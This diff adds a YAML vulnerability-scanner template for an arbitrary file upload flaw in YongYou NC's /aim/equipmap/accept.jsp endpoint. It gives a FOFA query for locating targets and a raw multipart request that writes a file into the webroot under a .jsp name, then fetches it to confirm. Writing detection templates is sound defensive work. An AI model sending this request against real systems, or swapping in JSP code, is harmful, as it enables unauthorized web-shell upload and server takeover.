@@ -1,0 +1,65 @@
+id: yongyou-nc-accept-upload
+
+info:
+  name: YongYou NC Accept Upload
+  author: Cuerz
+  severity: critical
+  verified: false
+  description: |
+    fofa：icon_hash="1085941792"
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkyMTMwNjU1Mg==&chksm=c184c6a1f6f34fb788437557f0e7708c74b16928e5973772db09b12067f10cf28b108701f67a&idx=1&lang=zh_CN&mid=2247488118&sn=16217c422eafc656df5fcacee9aa2153&token=857848930#rd
+
+set:
+    r1: randomLowercase(8)
+    r2: randomLowercase(32)
+rules:
+  r0:
+    # request:
+    #   method: POST
+    #   path: /aim/equipmap/accept.jsp
+    #   headers:
+    #     Cookie: JSESSIONID=33A7E4A8F9A2F3D7EACA2768A172B7F5.server
+    #     Content-Type: multipart/form-data; boundary=--------170237501
+    #   body: "\
+    #       ----------170237501\r\n\
+    #       Content-Disposition: form-data; name=\"file\";filename=\"{{r1}}.txt\"\r\n\
+    #       \r\n\
+    #       {{r2}}\r\n\
+    #       ----------170237501\r\n\
+    #       Content-Disposition: form-data; name=\"fname\"\r\n\
+    #       \r\n\
+    #       \\webapps\\nc_web\\{{r1}}.txt
+    #       ----------170237501--\r\n\
+    #       "
+    request:
+      raw: |
+        POST /aim/equipmap/accept.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=33A7E4A8F9A2F3D7EACA2768A172B7F5.server
+        Connection: close
+        Content-Type: multipart/form-data; boundary=--------170237501
+        Content-Length: 242
+
+        ----------170237501
+        Content-Disposition: form-data; name="file";filename="{{r1}}.txt"
+
+        {{r2}}
+        ----------170237501
+        Content-Disposition: form-data; name="fname"
+
+        \\webapps\\nc_web\\{{r1}}.jsp
+        ----------170237501--
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{r1}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(r2))
+expression: r0() && r1()
+      
